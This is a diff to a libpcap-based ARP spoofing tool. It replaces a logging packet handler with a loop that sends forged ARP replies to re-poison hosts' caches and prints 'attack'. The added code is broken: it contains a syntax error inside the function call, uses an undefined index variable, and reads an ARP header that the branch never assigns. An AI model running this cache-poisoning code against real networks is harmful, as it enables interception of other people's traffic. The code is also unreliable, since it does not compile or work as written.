@@ -65,16 +65,6 @@ int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest
     return res;
 }
 
-void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
-    struct EthHdr *eth_header;
-    eth_header = (struct EthHdr *)pkt_data;
-
-    // Check if the packet is an ARP packet
-    if (ntohs(eth_header->type_) == EthHdr::Arp) {
-        printf("ARP packet captured!\n");
-        // You can add more detailed processing here if needed
-    }
-}
 
 uint8_t my_mac[6];
 
@@ -125,6 +115,32 @@ int main(int argc, char* argv[]) {
 	}
 	printf("attack All\n");
 
-	pcap_loop(handle, 0, packet_handler, NULL);
+	const u_char* rcvpacket;
+	PEthHdr ethernet_hdr;
+	PArpHdr arp_hdr;
+	while(true){
+		int res = pcap_next_ex(handle, &header, &rcvpacket);
+		if (res == 0) continue;
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
+
+		ethernet_hdr = (PEthHdr)rcvpacket;
+		uint16_t eth_type = ethernet_hdr->type();
+
+		if(eth_type == EthHdr::Arp){
+			// sender ip address check, => re infection
+			rcvpacket += sizeof(struct EthHdr);
+			arp_hdr = (PArpHdr)rcvpacket;
+
+			Ip reinfect_sender = Ip(arp_hdr->sip());
+
+		}
+		else{
+			if(send_packet_arp(Mac(arp_hdr->smac();),Mac(my_mac),Mac(arp_hdr->smac();),Ip(argv[2*i+1]),Ip(argv[2*i]),false)==0){
+			printf("attack\n");
+		}
+		}
+	}
+
+
 	pcap_close(handle);
 }
